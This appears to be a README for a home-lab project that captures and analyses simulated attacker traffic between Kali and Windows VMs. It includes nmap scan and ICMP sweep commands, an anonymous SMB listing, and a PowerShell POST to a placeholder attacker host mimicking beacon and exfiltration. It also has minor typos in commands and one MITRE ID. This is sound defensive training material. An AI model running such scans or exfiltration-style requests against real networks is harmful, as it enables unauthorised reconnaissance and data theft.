 ## ⛓ Network Traffic Analysis (Kali + Windows)
 ### Objective
Capture and analyze network traffic for common attacker behaviors (scan, beacon/HTTP exfil, ICMP sweep, SMB touch) and document detections.

### Lab Topology
- Put Kali and Windows on the same **Host-Only** or Internal network in your hypervisor (Please see Image 1.1 & 1.2 within the Screenshots folder).
- Find IPs (Please see Image 1.3 & 1.4 within the Screenshots folder):
   + Kali: `ip a` (note interface like eth0 or ens33)
     + Kali (attacker/analyst): `<KALI_IP>`
   + Windows: `ipconfig`
     + Windows 10 VM (victim): `<WIN_IP>`

### Tools
- tcpdump / Wireshark (packet capture) (Please see Image 2 within the Screenshots folder)
  + **Kali:**
   ```Bash
   sudo apt update
   sudo apt install -y wireshark tcpdump zeek nmap curl
   ```
  + **Windows:** install **Wireshark (optional) and ensure **PowerShell** is available.

    **Note:** capture on Kali (attacker) while you generate traffic between Kali ↔ Windows.
- Zeek (pcap → structured logs)
- (Optional) Splunk (search/visualize Zeek logs)

### First capture
This is the **Baseline** capture.
1. Method 1: On Kali (replace `eth0` with your interface):

```Bash

Sudo tcpdump -i eth0 -w baseline .pcap
```
Leave this running while you generate traffic (next section). Press **Ctrl+C** to stop and write the file.


2.  Using Wireshark (my preffered option)
Start **Wireshark** on Kali → select your interface → click start (blue shar icon) → later click Stop (red square) → Save as `baseline.pcap`. 


### Scenarios
We’ll do 4 useful, resume-worthy scenarios. Run each while capturing (new pcap per scenario), then stop capture after each.

1. Port scan → `scan_windows.pcap` (MITRE T1046)
On **Kali:**

```bash
Sudo nmap -sS -T4 -p 1-1024 <WINDOWS_IP>

```

Save capture as `scan_windows.pcap`.
**MITRE:** Discovery (T1046 - Network Service Discovery)
  
2. HTTP beacon/exfil → `http_exfil.pcap` (T1071.001, T1041)
On **Kali**, start a mini web server:

```bash
pythons -m http.server 8000

```

On Windows (PowerShell), send a fake “beacon/exfil” POST:

```powershell

Invoke-WebRequest -Uri "http://<KALI_IP>:8000/upload" -Method POST -Body "sample=hello&user=victim1"
Start-Sleep -Seconds 5
Invoke-WebRequest -Uri "http://<KALI_IP>:8000/beat"   -Method GET

```

Stop capture → save as `http_exfil.pcap`.
**MITRE:** Command & Control (T1071.001 - Web Protocols), Exfiltration (T1041 - Exfil over C2 channel)

3. ICMP sweep → `icmp_sweep.pcap` (T1018)
On **Kali** (pick your /24):

```bash

sudo nmap -sn <YOUR_SUBNET>/24

```

Save as `icmp_sweep.pcap`.
**MITRE:** Discovery (T108 - Remote System Discovery)

4. SMB touch → `smb_touch.pcap` (T1135)
From **Kali** (non-auth listing may fail harmlessly but still generates traffic):

```bash
smbclient -L //<WINDOWS_IP>/ -N

```
Save as `smb_touch.pcap`.
**MITRE:** Discovery (T1135 - Network Share Discovery), Lateral Movement (surface only)
Tip: Keep pcaps <50-100 MB; if larger, zip them.

### How to Reproduce
See `reports/NTA_Methodology.md` for exact commands and Wireshark filters.

### Findings
- `reports/Findings_scan.md`
- `reports/Findings_http.md`
- `reports/Findings_icmp.md`
- `reports/Findings_smb.md`

### Evidence
- `pcaps/` (captured traffic)
- `zeek/` (parsed logs)
- `screenshots/` (Wireshark/Splunk)
